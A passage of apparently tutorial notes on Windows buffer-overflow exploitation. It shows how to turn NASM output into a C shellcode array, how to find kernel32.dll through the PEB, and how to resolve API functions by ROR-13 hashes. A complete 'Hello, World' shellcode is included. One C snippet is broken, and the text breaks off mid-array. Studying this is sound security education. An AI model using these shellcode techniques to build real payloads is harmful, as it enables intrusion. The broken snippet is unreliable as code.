<h2 id="3-5-Using-NASM-to-Obtain-Shellcode"><a href="#3-5-Using-NASM-to-Obtain-Shellcode" class="headerlink" title="3.5 - Using NASM to Obtain Shellcode"></a>3.5 - Using NASM to Obtain Shellcode</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//fonReadbin.cpp<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br>#include &lt;vector&gt;<br>#include &lt;algorithm&gt;<br>#include &lt;iomanip&gt;<br><br>using namespace std;<br>typedef vector&lt;unsigned char&gt; BinaryArray;<br><br>void usage();<br>bool read_binary(ifstream&amp;, BinaryArray&amp;);<br>unsigned output_hex(BinaryArray const&amp;, unsigned const);<br><br>int main(int argc, char* argv[]) &#123;<br>	if (argc &lt; 2) &#123;<br>		usage();<br>		return -1;<br>	&#125;<br>	<br>	ifstream fin(argv[1], ios_base::binary);<br>	if (!fin) &#123;<br>		cerr &lt;&lt; &quot;failed to open file\&quot;&quot; &lt;&lt; argv[1] &lt;&lt; &quot;\&quot;.\n&quot;;<br>		return -1;<br>	&#125;<br>	<br>	BinaryArray array;<br>	if (!read_binary(fin, array)) &#123;<br>		cerr &lt;&lt; &quot;failed to parsed file \&quot;&quot; &lt;&lt; argv[1] &lt;&lt; &quot;\&quot;.\n&quot;;<br>		return -1;<br>	&#125;<br>	<br>	unsigned count_per_line = 16;<br>	if (argc &gt;= 3) count_per_line = atoi(argv[2]);<br>	cout &lt;&lt; &quot;//Read \&quot;&quot; &lt;&lt; argv[1] &lt;&lt; &quot;\&quot;\n&quot;<br>		 &lt;&lt; &quot;//Size: &quot; &lt;&lt; array.size() &lt;&lt; &quot; bytes\n&quot;<br>		 &lt;&lt; &quot;//Count per line: &quot; &lt;&lt; count_per_line &lt;&lt; &quot;\n&quot;;<br>	unsigned null_count = output_hex(array, count_per_line);<br>	cout &lt;&lt; &quot;//NULL count: &quot; &lt;&lt; null_count &lt;&lt; &#x27;\n&#x27;;<br>&#125;<br><br>unsigned output_hex(BinaryArray const &amp;carr, unsigned const cpl) &#123;<br>	unsigned null = 0;<br>	cout &lt;&lt; &quot;char code[] = \n\&quot;&quot;;<br>	for (size_t i = 1; i &lt;= carr.size(); ++i) &#123;<br>		cout &lt;&lt; &quot;\\x&quot; &lt;&lt; hex &lt;&lt; setw(2)<br>			 &lt;&lt; setfill(&#x27;0&#x27;) &lt;&lt; (unsigned)(carr[i-1]);<br>		if (!(i % cpl)) &#123;<br>			cout &lt;&lt; &quot;\&quot;\n&quot;;<br>			if (i &lt; carr.size())<br>				cout &lt;&lt; &#x27;\&quot;&#x27;;<br>		&#125;<br>		<br>		if (!(carr[i-1]))<br>			++null;<br>	&#125;<br>	<br>	if (carr.size() % cpl)<br>		cout &lt;&lt; &#x27;\&quot;&#x27;;<br>	cout &lt;&lt; &quot;;\n&quot;;<br>	<br>	return null;<br>&#125;<br><br>bool read_binary(ifstream&amp; fin, BinaryArray&amp; arr) &#123;<br>	try &#123;<br>		unsigned file_length;<br>		<br>		fin.seekg(0, ios::end);<br>		file_length = fin.tellg();<br>		fin.seekg(0, ios::beg);<br>		<br>		arr.resize(file_length);<br>		char *mem_buf = new char[file_length];<br>		fin.read(mem_buf, file_length);<br>		copy(mem_buf, mem_buf + file_length, arr.begin());<br>		delete[] mem_buf;<br>	&#125; catch (...) &#123;<br>		return false;<br>	&#125;<br>	<br>	return true;<br>&#125;<br><br>void usage() &#123;<br>	cout &lt;&lt; &quot;Usage: fonReadbin &lt;asm_bin_file&gt; [count_per_line=16]\n&quot;<br>		 &lt;&lt; &quot;Read binary data from the file and output the hex string for C/C++\n&quot;<br>		 &lt;&lt; &quot;Version: 1.0\n&quot;<br>		 &lt;&lt; &quot;Example: ./fonReadBin shellcode.asm 32&quot;;<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="3-6-Review-the-First-Shellcode"><a href="#3-6-Review-the-First-Shellcode" class="headerlink" title="3.6 - Review the First Shellcode"></a>3.6 - Review the First Shellcode</h2><p>Mostly, a PE file which compiled with Dev-C++ loads <code>msvcrt.dll</code>.</p>
<p>On Windows XP, a PE file typically have a fixed ImageBase.<br>However, starting from Windows Vista, ASLR randomizes the ImageBase.</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.8.png'><img src="/images/books/bufferoverflow/3.8.png" width="700">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.9.png'><img src="/images/books/bufferoverflow/3.9.png" width="700">
</p>

<h3 id="Obtain-the-ImageBase-Address-of-kernel32-dll-via-PEB"><a href="#Obtain-the-ImageBase-Address-of-kernel32-dll-via-PEB" class="headerlink" title="Obtain the ImageBase Address of kernel32.dll via PEB"></a>Obtain the ImageBase Address of <code>kernel32.dll</code> via PEB</h3><p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.10.png'><img src="/images/books/bufferoverflow/3.10.png" width="700">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.11.png'><img src="/images/books/bufferoverflow/3.11.png" width="700">
</p>

<script type="math/tex; mode=display">
\begin{align*}
FS + 0x00 &= \&\_TEB\\
 &= \&(\_TEB.NtTib)\\
 &= \&(\_TEB.NtTib.ExceptionList)\\

FS + 0x18 &= \&(\_TEB.NtTib.Self)\\
&= \&(\&(\_TEB.NtTib))\\
&= \&(\&(\_TEB))\\

FS + 0x30 &= \&(\_TEB.ProcessEnvironmentBlock)\\
&= \&(\&(\_PEB))
\end{align*}</script><p>These three expresions are equivalent to:</p>
<script type="math/tex; mode=display">
\begin{align*}
*(FS+0x00) &= \_TEB\\
&=\_TEB.NtTib\\
&=\_TEB.NtTib.ExceptionList\\

*(FS+0x18) &= \_TEB.NtTib.Self\\
&=(\_TEB.NtTib)\\
&=(\_TEB)\\

*(FS+0x30) &= \_TEB.ProcessEnvironmentBlock\\
&= \&(\_PEB)
\end{align*}</script><hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int main()<br>&#123;<br>    __try<br>    &#123;<br>        int i = 0;<br>    &#125;<br>    __except(1)<br>    &#123;<br>        int j = 1;<br>    &#125;<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>This code has assembly codes like this:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PUSH EBP<br>MOV EBP,ESP<br>PUSH FF<br>PUSH 00404000<br>PUSH 00401140<br>MOV EAX,FS:[00000000]<br>PUSH EAX<br>MOV DWORD PTR FS:[00000000],ESP<br></code></pre></td></tr></table></figure></p>
<p>We can rewrite the relationship of FS and _TEB in form of FS:[Offset]</p>
<script type="math/tex; mode=display">
\begin{align*}
FS:[0x00] &= \_TEB\\
&=\_TEB.NtTib\\
&=\_TEB.NtTib.ExceptionList\\

FS:[0x18] &= \_TEB.NtTib.Self\\
&=(\_TEB.NtTib)\\
&=(\_TEB)\\

FS:[0x30] &= \_TEB.ProcessEnvironmentBlock\\
&= \&(\_PEB)
\end{align*}</script><hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; dt ntdll!_CLIENT_ID<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.12.png'><img src="/images/books/bufferoverflow/3.12.png" width="800">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; dt ntdll!_PEB_LDR_DATA<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.13.png'><img src="/images/books/bufferoverflow/3.13.png" width="800">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; !peb<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.14.png'><img src="/images/books/bufferoverflow/3.14.png" width="800">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; dt ntdll!_PEB_LDR_DATA 774b5da0<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.15.png'><img src="/images/books/bufferoverflow/3.15.png" width="800">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; dt ntdll!_PEB_LDR_DATA 774b5dbc<br></code></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
774b5da0 + 0x01c = 774b5dbc</script><p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.16.png'><img src="/images/books/bufferoverflow/3.16.png" width="800">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; dl 774b5dbc<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.17.png'><img src="/images/books/bufferoverflow/3.17.png" width="800">
</p>

<h3 id="Obtain-LoadLibraryA-from-the-ImageBase-of-kernel32-dll"><a href="#Obtain-LoadLibraryA-from-the-ImageBase-of-kernel32-dll" class="headerlink" title="Obtain LoadLibraryA() from the ImageBase of kernel32.dll"></a>Obtain LoadLibraryA() from the ImageBase of kernel32.dll</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; lm<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.18.png'><img src="/images/books/bufferoverflow/3.18.png" width="800">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; db 75540000<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.19.png'><img src="/images/books/bufferoverflow/3.19.png" width="800">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; dt _IMAGE_DOS_HEADER<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.20.png'><img src="/images/books/bufferoverflow/3.20.png" width="800">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; dd (75540000+0x03c)<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.21.png'><img src="/images/books/bufferoverflow/3.21.png" width="800">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; dd (75540000+0x03c) l1<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.22.png'><img src="/images/books/bufferoverflow/3.22.png" width="800">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; dt ntdll!_IMAGE_OPTIONAL_HEADER (75540000+0xe8+0x18)<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.23.png'><img src="/images/books/bufferoverflow/3.23.png" width="800">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; dt ntdll!_IMAGE_DATA_DIRECTORY (75540000+0xe8+0x18+0x60)<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.24.png'><img src="/images/books/bufferoverflow/3.24.png" width="1000">
</p>

<p>So, the absolute address of in its virtual memory is:</p>
<script type="math/tex; mode=display">
\begin{align*}
Absolute Virtual Address (VA) &= RVA + ImageBase\\
&= 0x75540000 + 0x93920\\
&= 0x755d3920
\end{align*}</script><hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;<br>	DWORD	Characteristics;<br>	DWORD	TimeDateStamp;<br>	WORD	MajorVersion;<br>	WORD	MinorVersion;<br>	DWORD	Name;<br>	DWORD	Base;<br>	DWORD	NumberOfFunctions;<br>	DWORD	NumberOfNames;<br>	DWORD	AddressOfFunctions;<br>	DWORD	AddressOfNames;<br>	DWORD	AddressOfNameOrdinals;<br>&#125; IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;<br><br>//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h<br></code></pre></td></tr></table></figure>
<p>To obtain the data of <code>NumberofNames</code>, <code>AddressOfFunctions</code>, <code>AddressofNames</code> and <code>AddressOfNameOrdinals</code>. We have to calculate the virtual addresses using the offsets:</p>
<script type="math/tex; mode=display">
\text{Given: ImageBase = 0x75540000. Therefore:}\\
\begin{align*}
\text{VA of NumberOfNames} &= Size(DWORD) \times 5 + Size(WORD) \times 2\\
&= Size(WORD) \times 2 \times 5 + Size(WORD) \times 2\\
&= Size(WORD) \times 12\\
&= Size(unsigned short) \times 2 \times 12\\
&= 24_{10} \enspace bytes\\
&= 18_{16} (\text{or 0x18}) \enspace bytes\\

\\

\text{VA of AddressOfFunctions} &= \text{VA of NumberOfNames} + Size(DWORD)\\
&= \text{0x18} + \text{0x4 bytes}\\
&= \text{0x1c bytes}\\

\\

\text{VA of AddressOfNames} &= \text{VA of AddressOfFunctions} + Size(DWORD)\\
&= \text{0x1c + 0x4 bytes}\\
&= \text{0x20 bytes}\\

\\

\text{VA of AddressOfNameOrdinals} &= \text{VA of AddressOfNames} + Size(DWORD)\\
&= \text{0x20 + 0x4 bytes}\\
&= \text{0x24 bytes}\\
\end{align*}</script><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; dd (75540000+0x93920+0x18) l1<br>0:000&gt; dd (75540000+0x93920+0x1c) l1<br>0:000&gt; dd (75540000+0x93920+0x20) l1<br>0:000&gt; dd (75540000+0x93920+0x24) l1<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.25.png'><img src="/images/books/bufferoverflow/3.25.png" width="800">
</p>

<p>Thus, the addresses of the arrays are:</p>
<script type="math/tex; mode=display">
\begin{align*}
Functions &= \text{75540000 + 0x3948}\\
Names &= \text{75540000 + 0x95270}\\
Ordinals &= \text{75540000 + 0x96b98}
\end{align*}</script><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">db (0x75540000+0x3948) l40<br>db (0x75540000+0x95270) l40<br>db (0x75540000+0x96b98) l40<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.26.png'><img src="/images/books/bufferoverflow/3.26.png" width="800">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; da (75540000+0x097898)<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.27.png'><img src="/images/books/bufferoverflow/3.27.png" width="1000">
</p>



<h3 id="The-Hash-Value-of-a-Function"><a href="#The-Hash-Value-of-a-Function" class="headerlink" title="The Hash Value of a Function"></a>The Hash Value of a Function</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">extern char *c;<br>unsigned h = 0;<br>while (*c) h = ((h&lt;&lt;5) | (h&gt;&gt;27))+*c++;<br></code></pre></td></tr></table></figure>
<hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">compute_hash:<br>    xor edi, edi<br>    xor eax, eax<br>    cld<br>compute_hash_again:<br>    lodsb<br>    test al, al<br>    jz compute_hash_finished<br>    ror edi, 0xd<br>    add edi, eax<br>    jmp compute_hash_again<br>compute_hash_finished:<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">extern char *c;<br>unsigned h = 0;<br>whle (*c) h=((h&lt;19) | (h&gt;&gt;3))+*c++;<br></code></pre></td></tr></table></figure>
<p>cld: clear direction-flag.<br>lodsb: Loads a byte, word, or doubleword from the source operand into the AL, AX, or EAX register, respectively.<br>ror: rotate right.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//fonSimpleHash.cpp<br>#include &lt;iostream&gt;<br>#include &lt;iomanip&gt;<br>#include &lt;string&gt;<br><br>using namespace std;<br>unsigned const ROTATE_CONSTANT = 13;<br><br>unsigned hash(string const &amp;s) &#123;<br>	char const *c = s.c_str();<br>	unsigned h = 0;<br>	while (*c) h = ((h&lt;&lt;(32-ROTATE_CONSTANT)) | (h&gt;&gt;ROTATE_CONSTANT))+*c++;<br>	<br>	return h;<br>&#125;<br><br>unsigned little_endian(unsigned h) &#123;<br>	return (h&lt;&lt;24) | (h&lt;&lt;8 &amp; 0x00FF0000) | (h&gt;&gt;8 &amp; 0x0000FF00) | (h&gt;&gt;24);<br>&#125;<br><br>void usage() &#123;<br>	cout &lt;&lt; &quot;Usage: fonsimplehash &lt;Function Name&gt; [Funtion Name #2 #3 ...]\n&quot;<br>		 &lt;&lt; &quot;Output hash values for input function names\n&quot;<br>		 &lt;&lt; &quot;Version 1.0\n&quot;<br>		 &lt;&lt; &quot;Example1: ./fonsimplehash LoadLibraryA\n&quot;<br>		 &lt;&lt; &quot;Example2: ./fonsimplehash LoadLibraryA WinExec ExitThread\n&quot;<br>		 &lt;&lt; &quot;Or you can put function names in a text file, ex: names.txt,\n&quot;<br>		 	&quot;	one function name per line, and try ./fonsimplehash &lt; names.txt\n&quot;;<br>&#125;<br><br>int main(int argc, char* argv[]) &#123;<br>	if (argc &lt;= 1) usage();<br>	else &#123;<br>		cout &lt;&lt; left &lt;&lt; setw(24) &lt;&lt; &quot;Function Name&quot; &lt;&lt; setw(12) &lt;&lt; &quot;Hash Value&quot; &lt;&lt; &#x27;\n&#x27;<br>			 &lt;&lt; setw(24) &lt;&lt; &quot;---------&quot; &lt;&lt; setw(12) &lt;&lt; &quot;-----------&quot; &lt;&lt; &#x27;\n&#x27;;<br>		<br>		for (int i = 1; i &lt; argc; ++i) &#123;<br>			cout &lt;&lt; setw(24) &lt;&lt; argv[i]<br>				 &lt;&lt; hex &lt;&lt; setw(12) &lt;&lt; little_endian(hash(argv[i])) &lt;&lt; &#x27;\n&#x27;;<br>		&#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.28.png'><img src="/images/books/bufferoverflow/3.28.png" width="1000">
</p>

<p><strong>The completed shellcode:</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[Section .text]<br>[BITS 32]<br>global _start<br>_start:<br>    jmp KERNEL32_BASE<br><br>FIND_FUNCTION:<br>    pushad<br>    mov ebp,[esp+0x24]<br>    mov eax,[ebp+0x3c]<br>    mov edx,[ebp+eax+0x78]<br>    add edx,ebp<br>    mov ecx,[edx+0x18]<br>    mov ebx,[edx+0x20]<br>    add ebx,ebp<br>FIND_FUNCTION_LOOP:<br>    jecxz FIND_FUNCTION_END<br>    dec ecx<br>    mov esi,[ebx+ecx*4]<br>    add esi,ebp<br>COMPUTE_HASH:<br>    xor edi,edi<br>    xor eax,eax<br>    cld<br>COMPUTE_HASH_LOOP:<br>    lodsb<br>    test al,al<br>    jz COMPUTE_HASH_END<br>    ror edi,0xd<br>    add edi,eax<br>    jmp COMPUTE_HASH_LOOP<br>COMPUTE_HASH_END:<br>    cmp edi,[esp+0x28]<br>    jnz FIND_FUNCTION_LOOP<br>    mov ebx,[edx+0x24]<br>    add ebx,ebp<br>    mov cx,[ebx+ecx*2]<br>    mov ebx,[edx+0x1c]<br>    add ebx,ebp<br>    mov eax,[ebx+ecx*4]<br>    add eax,ebp<br>    mov [esp+0x1c],eax<br>FIND_FUNCTION_END:<br>    popad<br>    ret<br><br>KERNEL32_BASE:<br>    xor eax,eax<br>    mov ebx,[fs:eax+0x30]<br>    mov ebx,[ebx+0x0c]<br>    add ebx,0x1c<br>KERNEL32_BASE_NEXT_MODULE:<br>    mov ebx,[ebx]<br>    mov ecx,[ebx+0x08]<br>    mov edx,[ebx+0x20]<br>    cmp [edx+0x18],al<br>    jne KERNEL32_BASE_NEXT_MODULE<br><br>    push 0xec0e4e48<br>    push ecx<br>    call FIND_FUNCTION<br><br>    push 0x00006c6c<br>    push 0x642e7472<br>    push 0x6376736d<br>    push esp<br>    call eax<br><br>    push 0xd5a73c1e<br>    push eax<br>    call FIND_FUNCTION<br>    mov ecx,eax<br><br>    mov DWORD [esp+0x04],0xcd481e74<br>    call FIND_FUNCTION<br>    mov edx,eax<br><br>    push 0x00000A21<br>    push 0x646C726F<br>    push 0x57202C6F<br>    push 0x6C6C6548<br>    mov esi,esp<br>    xor eax,eax<br>    push eax<br>    push edx<br>    push esi<br>    call ecx<br>    pop edx<br>    pop edx<br>    call edx<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.29.png'><img src="/images/books/bufferoverflow/3.29.png" width="1000">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;cstdio&gt;<br>using namespace std;<br><br>char shellcode[] 